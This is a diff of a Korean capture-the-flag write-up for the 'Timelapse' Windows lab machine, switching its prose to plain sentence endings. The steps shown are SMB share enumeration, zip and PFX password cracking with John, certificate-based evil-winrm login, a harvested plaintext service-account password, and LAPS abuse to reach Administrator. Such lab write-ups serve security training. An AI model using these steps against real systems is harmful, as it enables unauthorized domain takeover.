@@ -12,9 +12,9 @@ categories: [AD, Easy]
 
 ### 개요 (Synopsis)
 
-Timelapse는 쉬운 난이도의 Windows 머신으로, PFX 키가 포함된 zip 파일이 있는 공개 접근 가능한 SMB 공유 폴더에 접근하는 과정을 다룹니다. 이 zip 파일은 비밀번호를 요구하며, John(John the Ripper)을 사용해 크랙할 수 있습니다. zip 파일의 압축을 풀면 비밀번호로 암호화된 PFX 파일이 나오는데, 이 역시 PFX 파일을 John이 읽을 수 있는 해시 형식으로 변환하여 비밀번호를 알아낼 수 있습니다. PFX 파일에서 SSL 인증서와 개인 키를 추출해 내면 WinRM으로 로그인하는 데 사용할 수 있습니다.
+Timelapse는 쉬운 난이도의 Windows 머신으로, PFX 키가 포함된 zip 파일이 있는 공개 접근 가능한 SMB 공유 폴더에 접근하는 과정을 다룹니다. 이 zip 파일은 비밀번호를 요구하며, John(John the Ripper)을 사용해 크랙할 수 있다. zip 파일의 압축을 풀면 비밀번호로 암호화된 PFX 파일이 나오는데, 이 역시 PFX 파일을 John이 읽을 수 있는 해시 형식으로 변환하여 비밀번호를 알아낼 수 있다. PFX 파일에서 SSL 인증서와 개인 키를 추출해 내면 WinRM으로 로그인하는 데 사용할 수 있다.
 
-인증을 마치고 접속한 후, `svc_deploy` 사용자의 로그인 자격 증명이 포함된 PowerShell 기록 파일(history file)을 발견합니다. 사용자 열거를 통해 `svc_deploy`가 `LAPS_Readers`라는 그룹의 구성원임을 알 수 있습니다. `LAPS_Readers` 그룹은 LAPS 내의 비밀번호를 관리할 수 있는 권한이 있으며, 이 그룹의 모든 사용자는 도메인 내 머신들의 로컬 비밀번호를 읽을 수 있습니다. 이러한 신뢰 관계를 악용하여 `Administrator`(관리자)의 비밀번호를 검색하고 WinRM 세션을 획득합니다.
+인증을 마치고 접속한 후, `svc_deploy` 사용자의 로그인 자격 증명이 포함된 PowerShell 기록 파일(history file)을 발견한다. 사용자 열거를 통해 `svc_deploy`가 `LAPS_Readers`라는 그룹의 구성원임을 알 수 있다. `LAPS_Readers` 그룹은 LAPS 내의 비밀번호를 관리할 수 있는 권한이 있으며, 이 그룹의 모든 사용자는 도메인 내 머신들의 로컬 비밀번호를 읽을 수 있다. 이러한 신뢰 관계를 악용하여 `Administrator`(관리자)의 비밀번호를 검색하고 WinRM 세션을 획득한다.
 
 ### 요구 기술 (Skills Required)
 
@@ -33,7 +33,7 @@ Timelapse는 쉬운 난이도의 Windows 머신으로, PFX 키가 포함된 zip 
 
 ### Nmap
 
-Nmap을 사용하여 열려 있는 포트를 스캔하는 것으로 시작해 보겠습니다.
+Nmap을 사용하여 열려 있는 포트를 스캔하는 것으로 시작한다.
 
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 -Pn TARGET_IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -81,11 +81,11 @@ Host script results:
 
 ```
 
-Nmap 출력 결과를 보면 여러 포트가 열려 있고, 머신 이름은 `dc01`, 도메인 이름은 `timelapse.htb`인 것을 알 수 있습니다. SMB 포트가 열려 있는 것을 확인했으므로, 익명으로 접근 가능한 공유 폴더가 있는지 검증해 봅니다.
+Nmap 출력 결과를 보면 여러 포트가 열려 있고, 머신 이름은 `dc01`, 도메인 이름은 `timelapse.htb`인 것을 알 수 있다. SMB 포트가 열려 있는 것을 확인했으므로, 익명으로 접근 가능한 공유 폴더가 있는지 검증해 봅니다.
 
 ### PFX 파일
 
-사용 가능한 SMB 공유를 확인하기 위해 다음 명령을 사용합니다.
+사용 가능한 SMB 공유를 확인하기 위해 다음 명령을 사용한다.
 
 ```bash
 smbclient -L //TARGET_IP/
@@ -106,7 +106,7 @@ SYSVOL          Disk      Logon server share
 
 ```
 
-위의 출력을 보면 `Shares`라는 이름의 공유 폴더가 있으며, 자격 증명 없이도 접근할 수 있음을 알 수 있습니다.
+위의 출력을 보면 `Shares`라는 이름의 공유 폴더가 있으며, 자격 증명 없이도 접근할 수 있음을 알 수 있다.
 
 ```bash
 smbclient //TARGET_IP/Shares
@@ -136,9 +136,9 @@ smb: \Dev\>
 
 ```
 
-`Dev`와 `HelpDesk`라는 두 개의 폴더를 찾았습니다. `Dev` 폴더 안에는 `winrm_backup.zip`이라는 zip 파일이 있습니다. 파일의 압축을 풀려고 시도하면 현재로서는 알 수 없는 비밀번호를 요구합니다.
+`Dev`와 `HelpDesk`라는 두 개의 폴더를 찾았다. `Dev` 폴더 안에는 `winrm_backup.zip`이라는 zip 파일이 있다. 파일의 압축을 풀려고 시도하면 현재로서는 알 수 없는 비밀번호를 요구한다.
 
-해시 크래킹 도구인 John을 사용하여 비밀번호를 크랙하려고 시도해 보겠습니다. 하지만 먼저 `zip2john` 유틸리티를 사용하여 zip 파일을 해시 형식으로 변환해야 합니다.
+해시 크래킹 도구인 John을 사용하여 비밀번호를 크랙하려고 시도한다. 하지만 먼저 `zip2john` 유틸리티를 사용하여 zip 파일을 해시 형식으로 변환해야 한다.
 
 ```bash
 zip2john winrm_backup.zip > zip.john
@@ -160,7 +160,7 @@ Session completed
 
 ```
 
-결과물은 PKCS#12 형식의 SSL 인증서와 개인 키가 포함된 PFX 파일입니다. PFX 파일은 비밀번호 없이 로그인하기 위해 WinRM에서 사용할 수 있습니다. 파일에서 이것들을 추출해 봅시다.
+결과물은 PKCS#12 형식의 SSL 인증서와 개인 키가 포함된 PFX 파일이다. PFX 파일은 비밀번호 없이 로그인하기 위해 WinRM에서 사용할 수 있다. 파일에서 이것들을 추출한다.
 
 ```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
@@ -173,9 +173,9 @@ Mac verify error: invalid password?
 
 ```
 
-위의 출력을 보면 `supremelegacy`와는 다른 비밀번호가 필요하다는 것을 알 수 있습니다. `pfx2john` 유틸리티를 활용하여 pfx 파일을 해시 형식으로 변환한 다음, John을 사용해 비밀번호를 크랙합니다.
+위의 출력을 보면 `supremelegacy`와는 다른 비밀번호가 필요하다는 것을 알 수 있다. `pfx2john` 유틸리티를 활용하여 pfx 파일을 해시 형식으로 변환한 다음, John을 사용해 비밀번호를 크랙한다.
 
-다음 명령을 사용하여 pfx 파일의 비밀번호를 성공적으로 크랙할 수 있습니다.
+다음 명령을 사용하여 pfx 파일의 비밀번호를 성공적으로 크랙할 수 있다.
 
 ```bash
 python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
@@ -197,9 +197,9 @@ Session completed
 
 ```
 
-**참고:** Python3을 사용하는 경우, John이 해시를 제대로 읽을 수 있도록 Python 스크립트 출력에서 `b'`와 `'`를 제거해 주어야 합니다.
+**참고:** Python3을 사용하는 경우, John이 해시를 제대로 읽을 수 있도록 Python 스크립트 출력에서 `b'`와 `'`를 제거해 주어야 한다.
 
-비밀번호가 크랙되면 다음 명령을 사용하여 pfx 파일에서 SSL 인증서와 개인 키를 추출합니다.
+비밀번호가 크랙되면 다음 명령을 사용하여 pfx 파일에서 SSL 인증서와 개인 키를 추출한다.
 
 ```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
@@ -213,9 +213,9 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
 
 ### 초기 침투 (Foothold)
 
-pfx 파일을 해독하고 유효한 키와 인증서를 생성했으므로 WinRM을 통한 로그인을 시도해 볼 수 있습니다. Nmap 명령의 출력에서 WinRM이 주로 사용하지만 암호화되지 않은 연결 대신 SSL을 사용하는 포트 5986이 열려 있는 것을 보았습니다. Evil-winrm은 `-c` 및 `-k` 플래그를 사용하여 키와 인증서를 전달할 수 있으므로, 인증서와 키를 전달하고 타겟에 인증할 수 있습니다.
+pfx 파일을 해독하고 유효한 키와 인증서를 생성했으므로 WinRM을 통한 로그인을 시도해 볼 수 있다. Nmap 명령의 출력에서 WinRM이 주로 사용하지만 암호화되지 않은 연결 대신 SSL을 사용하는 포트 5986이 열려 있는 것을 보았다. Evil-winrm은 `-c` 및 `-k` 플래그를 사용하여 키와 인증서를 전달할 수 있으므로, 인증서와 키를 전달하고 타겟에 인증할 수 있다.
 
-로그인한 후에는 명령줄 기록(commandline history)을 확인하여 권한을 상승시킬 수 있는지 알아보기 위해 수동으로 열거 작업을 수행합니다. 이렇게 하면 새로운 로그인 자격 증명을 발견할 수 있습니다.
+로그인한 후에는 명령줄 기록(commandline history)을 확인하여 권한을 상승시킬 수 있는지 알아보기 위해 수동으로 열거 작업을 수행한다. 이렇게 하면 새로운 로그인 자격 증명을 발견할 수 있다.
 
 ```powershell
 evil-winrm -i TARGET_IP -c cert.pem -k key.pem -S
@@ -240,14 +240,14 @@ exit
 
 ```
 
-새로운 자격 증명을 사용하여 다음 명령으로 Evil-winRM을 통해 로그인할 수 있습니다.
+새로운 자격 증명을 사용하여 다음 명령으로 Evil-winRM을 통해 로그인할 수 있다.
 
 ```powershell
 evil-winrm -i TARGET_IP -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 
 ```
 
-로그인 시 `svc_deploy`가 어느 그룹의 멤버인지 확인할 수 있습니다.
+로그인 시 `svc_deploy`가 어느 그룹의 멤버인지 확인할 수 있다.
 
 ```powershell
 net user svc_deploy
@@ -380,7 +380,7 @@ C:\Users\TRX\Desktop
 
 
 
-이전 명령의 출력을 보면 우리가 `LAPS_Readers` 그룹의 일원임을 알 수 있습니다. "Local Administrator Password Solution" (LAPS)는 Active Directory 컴퓨터의 로컬 계정 비밀번호를 관리하는 데 사용됩니다. github에서 `AdmPwd.PS`라는 이름의 비밀번호를 검색할 수 있는 PowerShell 모듈을 찾을 수 있습니다. 다음 명령을 사용하여 Evil-WinRM으로 모듈을 업로드할 수 있습니다.
+이전 명령의 출력을 보면 우리가 `LAPS_Readers` 그룹의 일원임을 알 수 있다. "Local Administrator Password Solution" (LAPS)는 Active Directory 컴퓨터의 로컬 계정 비밀번호를 관리하는 데 사용된다. github에서 `AdmPwd.PS`라는 이름의 비밀번호를 검색할 수 있는 PowerShell 모듈을 찾을 수 있다. 다음 명령을 사용하여 Evil-WinRM으로 모듈을 업로드할 수 있다.
 
 ```powershell
 upload AdmPwd.PS
@@ -394,7 +394,7 @@ Info: Upload successful!
 
 ```
 
-모듈을 업로드한 후 다음 명령을 사용하여 어떤 객체가 LAPS를 관리할 수 있는지 확인할 수 있습니다.
+모듈을 업로드한 후 다음 명령을 사용하여 어떤 객체가 LAPS를 관리할 수 있는지 확인할 수 있다.
 
 ```powershell
 Find-AdmPwdExtendedRights -identity *
@@ -419,7 +419,7 @@ More than one object found, search using distinguishedName instead
 
 ```
 
-출력 결과에서 `Domain Controllers`를 볼 수 있습니다. 우리가 비밀번호를 관리할 수 있는지 권한 보유자(right holders)를 살펴보겠습니다. 다음 명령을 사용하여 이를 수행합니다.
+출력 결과에서 `Domain Controllers`를 볼 수 있다. 우리가 비밀번호를 관리할 수 있는지 권한 보유자(right holders)를 살펴본다. 다음 명령을 사용하여 이를 수행한다.
 
 ```powershell
 Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
@@ -433,7 +433,7 @@ ExtendedRightHolders
 
 ```
 
-이전 명령의 출력에서 `LAPS_Readers` 그룹이 Domain Controllers에 대한 위임(delegation)을 가지고 있어 이 객체의 사용자 비밀번호를 읽을 수 있음을 보여줍니다. 다음 명령을 사용하여 비밀번호를 검색합니다.
+이전 명령의 출력에서 `LAPS_Readers` 그룹이 Domain Controllers에 대한 위임(delegation)을 가지고 있어 이 객체의 사용자 비밀번호를 읽을 수 있음을 보여줍니다. 다음 명령을 사용하여 비밀번호를 검색한다.
 
 ```powershell
 Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1
@@ -461,7 +461,7 @@ Timelapse\administrator
 
 ```
 
-관리자(administrator) 권한으로 쉘을 얻었으며 루트 플래그를 읽을 수 있습니다.
+관리자(administrator) 권한으로 쉘을 얻었으며 루트 플래그를 읽을 수 있다.
 
 ---
 
